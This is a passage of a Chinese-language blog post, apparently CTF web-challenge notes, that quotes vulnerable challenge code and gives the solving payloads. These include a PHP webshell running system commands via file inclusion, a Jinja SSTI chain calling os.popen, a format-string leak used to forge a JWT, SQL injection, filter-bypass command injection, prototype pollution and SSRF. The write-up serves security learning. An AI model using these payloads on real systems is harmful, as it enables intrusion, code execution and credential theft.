class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line">        	<span class="keyword">die</span>(<span class="string">&quot;这可不能上传啊！&quot;</span>);</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="variable">$content</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>read.php源码：include文件包含，过滤flag关键字</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&quot;filename&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;nononono&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过index.php对<code>ph</code>的过滤：图片后缀+php短标签（后续使用文件包含来执行php代码）</p>
+<p>绕过read.php对flag的正则过滤：?通配符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls /&quot;</span>); <span class="meta">?&gt;</span>	<span class="comment">//根目录下存在flag文件</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /????&quot;</span>); <span class="meta">?&gt;</span>	<span class="comment">//四个问号代表四个字符(flag)，提示flag在环境变量中</span></span><br><span class="line"><span class="meta">&lt;?=</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;env&quot;</span>); <span class="meta">?&gt;</span>	<span class="comment">//获取flag</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017222549672.png" alt="image-20231017222549672"></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231017222613249.png" alt="image-20231017222613249"></p>
+<p><strong>借鉴：可以直接连蚁剑，路径为read.php正在读取文件的时候</strong></p>
+<h2 id="18"><a href="#18" class="headerlink" title="18"></a>18</h2><h3 id="header"><a href="#header" class="headerlink" title="header"></a>header</h3><p>打开方式不对→改GET为POST</p>
+<p>需要N1k0la浏览器→修改User-Agent</p>
+<p>需要从本地来→添加X-Forwarded-For</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018132357505.png" alt="image-20231018132357505"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;0xGame2021&#x27;</span>];<span class="variable">$b</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;X1cT34m&#x27;</span>];<span class="variable">$d</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;Pupi1&#x27;</span>];<span class="variable">$c</span>=<span class="string">&#x27;welcome to the 0xGame2021&#x27;</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$d</span>)&amp;&amp;<span class="variable">$a</span>===<span class="variable">$c</span>)&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>POST请求也可以通过URL传递GET参数（URL编码）</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018132753708.png" alt="image-20231018132753708"></p>
+<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><p>后台扫描：&#x2F;admin，登录页面，猜测用户名为admin或administrator，密码为4位纯数字，可以爆破 burp intruder。</p>
+<h3 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h3><p>根据页面提示猜测URL参数名为search，传参<code>?search=&#123;&#123;7*7&#125;&#125;</code>验证存在ssti。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;%22%22[%27_%27%27_cla%27%27ss_%27%27_%27]%27_%27%27_base_%27%27_%27][%27_%27%27_subcla%27%27sses_%27%27_%27]()[189]%27_%27%27_init_%27%27_%27][%27_%27%27_globals_%27%27_%27][%27_%27%27_builtins_%27%27_%27][%27_%27%27_import_%27%27_%27](%27os%27).popen(%27cat%20/flag%27).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="cookies-1"><a href="#cookies-1" class="headerlink" title="cookies"></a>cookies</h3><p>认证消息md5绕过：md5(“aabg7XSs”)为0e开头的字符串，弱类型比较时会认为是科学计数法，0的任意次方都是0，构造另一个md5值也为0e开头的字符串，可以通过弱类型比较。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018150920359.png" alt="image-20231018150920359"></p>
+<p>会返回user参数，构造xss payload</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231018151156773.png" alt="image-20231018151156773"></p>
+<h2 id="19"><a href="#19" class="headerlink" title="19"></a>19</h2><h3 id="Object"><a href="#Object" class="headerlink" title="*Object"></a>*Object</h3><p>需要满足以下两个正则表达式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/[A-Za-z0-<span class="number">9</span>]+\(/i</span><br><span class="line"><span class="string">&#x27;/\w+\((?R)?\)/&#x27;</span>	<span class="comment">//?R是表示递归</span></span><br></pre></td></tr></table></figure>
+
+<p>构造payload：<code>&quot;;system(&quot;cat flag.php&quot;);&quot;</code>，绕过正则后无回显。</p>
+<h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>后台扫描存在：&#x2F;README.md，结果乱码，从响应包的<strong>原始数据</strong>中提取结果到在线乱码恢复平台<a target="_blank" rel="noopener" href="http://www.mytju.com/classCode/tools/messyCodeRecover.asp%EF%BC%8C%E5%BE%97%E5%88%B0%E6%8F%90%E7%A4%BA%E3%80%82">http://www.mytju.com/classCode/tools/messyCodeRecover.asp，得到提示。</a></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019222813718.png" alt="image-20231019222813718"></p>
+<p>查看游戏页面的源码，找到一个GET请求</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">getFlag</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;</span><br><span class="line">req.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;flag.php?score=&quot;</span>+obj.<span class="property">score</span>,<span class="literal">true</span>);</span><br><span class="line">req.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">    &#125;</span><br><span class="line">req.<span class="title function_">send</span>();&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>直接构造URL：&#x2F;flag.php?score&#x3D;1000000</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019223449964.png" alt="image-20231019223449964"></p>
+<h3 id="babyRCE"><a href="#babyRCE" class="headerlink" title="babyRCE"></a>babyRCE</h3><p>payload：<code>?rce=c\at$&#123;IFS&#125;fl\ag.php</code></p>
+<ul>
+<li>查看文件的命令过滤：c\at绕过</li>
+<li>空格过滤：${IFS}绕过</li>
+<li>flag过滤：fl\ag</li>
+</ul>
+<p>关键词绕过：</p>
+<ul>
+<li>反斜杠绕过，shell认为是行末续行。flag→fl\ag</li>
+<li>空变量绕过。flag→fl$@ag</li>
+</ul>
+<p>空格绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$IFS$9</span><br></pre></td></tr></table></figure>
+
+<h3 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP"></a>Do you know HTTP</h3><p>HS请求：修改请求method</p>
+<p>本地IP：添加请求头X-Forwarded-For</p>
+<p>从指定地址来：添加请求头Referer</p>
+<p>指定浏览器：修改User-Agent（感觉有点问题，浏览器只是UA头的一部分，并不应该修改全部）</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019230431176.png" alt="image-20231019230431176"></p>
+<h3 id="fake-galgame"><a href="#fake-galgame" class="headerlink" title="fake galgame"></a>fake galgame</h3><p>构造错误的JSON数据得到报错信息，根据<code>JSON.parse</code>猜测是原型链污染</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019234913680.png" alt="image-20231019234913680"></p>
+<p>构造payload，绕过直接的数值检测，从原型链上修改这三个属性的值。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;attributes&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;health&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;attack&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;armor&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;health&quot;</span><span class="punctuation">:</span><span class="number">100000</span><span class="punctuation">,</span><span class="attr">&quot;attack&quot;</span><span class="punctuation">:</span><span class="number">100000</span><span class="punctuation">,</span><span class="attr">&quot;armor&quot;</span><span class="punctuation">:</span><span class="number">100000</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231019234704766.png" alt="image-20231019234704766"></p>
+<h2 id="20"><a href="#20" class="headerlink" title="20"></a>20</h2><h3 id="Web安全入门指北-小饼干"><a href="#Web安全入门指北-小饼干" class="headerlink" title="Web安全入门指北-小饼干"></a>Web安全入门指北-小饼干</h3><p>第一次访问网站的响应头中有Set-Cookie，根据页面提示VIP，应该是修改Cookie中的VIP值。</p>
+<h3 id="地狱通讯"><a href="#地狱通讯" class="headerlink" title="地狱通讯"></a>地狱通讯</h3><p>源码分析</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag, FLAG	<span class="comment"># flag可能是需要的东西</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    f1ag = request.args.get(<span class="string">&#x27;f1ag&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">    exp = request.args.get(<span class="string">&#x27;exp&#x27;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span> </span><br><span class="line">    flAg = FLAG(f1ag) </span><br><span class="line">    message = <span class="string">&quot;Your flag is &#123;0&#125;&quot;</span> + exp </span><br><span class="line">    <span class="keyword">if</span> exp == <span class="string">&quot;&quot;</span>: </span><br><span class="line">        <span class="keyword">return</span> ctx </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(flAg) <span class="comment"># 重点在字符串格式化</span></span><br></pre></td></tr></table></figure>
+
+<p>在format之前exp已经拼接进去了，由于<code>&#123;0&#125;</code>是flAg（经过FLAG方法处理，可能是与flag相关的对象），构造<code>exp=&#123;0.__class__.__init__.__globals__&#125;</code>，读取flAg对象所在类的所有全局变量，找到flag</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020134940106.png" alt="image-20231020134940106"></p>
+<p>总结：format漏洞，python特殊函数</p>
+<h3 id="地狱通讯-改"><a href="#地狱通讯-改" class="headerlink" title="地狱通讯-改"></a>地狱通讯-改</h3><p>源码审计</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, headers, User <span class="comment"># 注意User和secret和headers都来自secret</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># ...接收name参数，不能为admin，但是后面读取flag需要name为admin</span></span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;	<span class="comment"># jwt加密</span></span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)	<span class="comment"># 验证token</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:	<span class="comment"># </span></span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is&quot;</span> + flag</span><br><span class="line">        <span class="keyword">return</span> message.<span class="built_in">format</span>(user) <span class="comment"># 存在与前一题一样的format漏洞</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>随便传一个name值获取到一个非admin用户的jwt值<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020140846860.png" alt="image-20231020140846860"></li>
+<li>构造payload获取secret：<code>flag=&#123;0.__class__.__init__.__globals__&#125;</code><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020141420410.png" alt="image-20231020141420410"></li>
+<li>构造admin的jwt<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020141834233.png" alt="image-20231020141834233"></li>
+<li>jwt绕过<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020142031106.png" alt="image-20231020142031106"></li>
+</ol>
+<h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><p>源码审计（需要提前了解<code>$$</code>的作用），payload为<code>a=flag&amp;flag=a</code>（GET参数），POST参数没用，一定不能传flag参数，会导致本来的flag变量的值被覆盖，所以POST请求体置空就行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;<span class="comment">//需要的东西</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;<span class="comment">//只需要有一个flag参数就行</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">//flag参数值不能为flag</span></span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;<span class="comment">//不重要，一定不能有flag参数</span></span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;<span class="comment">//第一轮：$a=$flag，使用$a暂存$flag的值</span></span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;				<span class="comment">//第二轮：$flag=$a，$flag回到原来的值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020204445245.png" alt="image-20231020204445245"></p>
+<p>总结：<code>$$</code>变量污染</p>
+<h3 id="sqlmap-boy"><a href="#sqlmap-boy" class="headerlink" title="*sqlmap_boy"></a>*sqlmap_boy</h3><p>前端源码中有提示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&#x27;select username,password from users where username=&quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; &amp;&amp; password=&quot;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>知道闭合符是双引号了，直接上万能密码：<code>admin&#39;&quot; or 1=1#</code>，登录成功，提示跳转到secrets.php?id&#x3D;1</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020211336154.png" alt="image-20231020211336154"></p>
+<p>secrets.php好像有问题</p>
+<h3 id="what-are-y0u-uploading？"><a href="#what-are-y0u-uploading？" class="headerlink" title="what are y0u uploading？"></a>what are y0u uploading？</h3><p>文件上传，前端JS验证文件后缀，随便上传一个图片得到提示，需要f1ag.php。直接burp改包：将上传图片的包修改一下filename即可。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020212919360.png" alt="image-20231020212919360"></p>
+<h3 id="God-of-Aim"><a href="#God-of-Aim" class="headerlink" title="God_of_Aim"></a>God_of_Aim</h3><p>先简单玩一下，达到10分后会弹出一部分flag，期间没有发起网络请求，猜测全程js控制，查看js代码，找到flag相关部分：alert的内容</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020213825145.png" alt="image-20231020213825145"></p>
+<p>直接在控制台输出flag</p>
+<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231020213917933.png" alt="image-20231020213917933" style="zoom:70%;" />
+
+<h3 id="nextGen2"><a href="#nextGen2" class="headerlink" title="nextGen2"></a>nextGen2</h3><p>在网站根目录下，所以可以用file:&#x2F;&#x2F;127.0.0.1&#x2F;flag.txt，但是存在过滤，猜测是对127.0.0.1有过滤，改为八进制绕过。<code>service=file://0177.0.0.1/flag.txt</code></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/09/29/%E5%8F%96%E8%AF%81/2023%E9%99%87%E5%89%91%E6%9D%AF/" rel="prev" title="2023陇剑杯">
+      <i class="fa fa-chevron-left"></i> 2023陇剑杯
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/10/15/%E6%B8%97%E9%80%8F/tryhackme/" rel="next" title="tryhackme">
+      tryhackme <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#202310"><span class="nav-number">1.</span> <span class="nav-text">202310</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#01"><span class="nav-number">1.1.</span> <span class="nav-text">01</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#inspect-me"><span class="nav-number">1.1.1.</span> <span class="nav-text">inspect-me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#my-first-sqli"><span class="nav-number">1.1.2.</span> <span class="nav-text">my-first-sqli</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#post-the-get"><span class="nav-number">1.1.3.</span> <span class="nav-text">post-the-get</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqli-0x1"><span class="nav-number">1.1.4.</span> <span class="nav-text">sqli-0x1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-lfi"><span class="nav-number">1.1.5.</span> <span class="nav-text">baby lfi</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#baby-lfi-2"><span class="nav-number">1.1.6.</span> <span class="nav-text">baby lfi 2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-06"><span class="nav-number">1.2.</span> <span class="nav-text">02-06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#challenge-creator"><span class="nav-number">1.2.1.</span> <span class="nav-text">*challenge-creator</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#06"><span class="nav-number">1.3.</span> <span class="nav-text">06</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nextGen1"><span class="nav-number">1.3.1.</span> <span class="nav-text">nextGen1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web1"><span class="nav-number">1.3.2.</span> <span class="nav-text">*web1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checkin"><span class="nav-number">1.3.3.</span> <span class="nav-text">checkin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jwt"><span class="nav-number">1.3.4.</span> <span class="nav-text">jwt</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#07"><span class="nav-number">1.4.</span> <span class="nav-text">07</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#easy-pop"><span class="nav-number">1.4.1.</span> <span class="nav-text">easy-pop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#command-injection"><span class="nav-number">1.4.2.</span> <span class="nav-text">command-injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%83%E9%80%B8"><span class="nav-number">1.4.3.</span> <span class="nav-text">逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#08"><span class="nav-number">1.5.</span> <span class="nav-text">08</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Make-Me-Cry"><span class="nav-number">1.5.1.</span> <span class="nav-text">Make Me Cry</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#09"><span class="nav-number">1.6.</span> <span class="nav-text">09</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezlogin"><span class="nav-number">1.6.1.</span> <span class="nav-text">*ezlogin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loginjection"><span class="nav-number">1.6.2.</span> <span class="nav-text">*loginjection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#superpop"><span class="nav-number">1.6.3.</span> <span class="nav-text">superpop</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#UnsafeDefenseSystem"><span class="nav-number">1.6.4.</span> <span class="nav-text">*UnsafeDefenseSystem</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10"><span class="nav-number">1.7.</span> <span class="nav-text">10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Jsonhub"><span class="nav-number">1.7.1.</span> <span class="nav-text">*Jsonhub</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fumo-backdoor"><span class="nav-number">1.7.2.</span> <span class="nav-text">**fumo backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 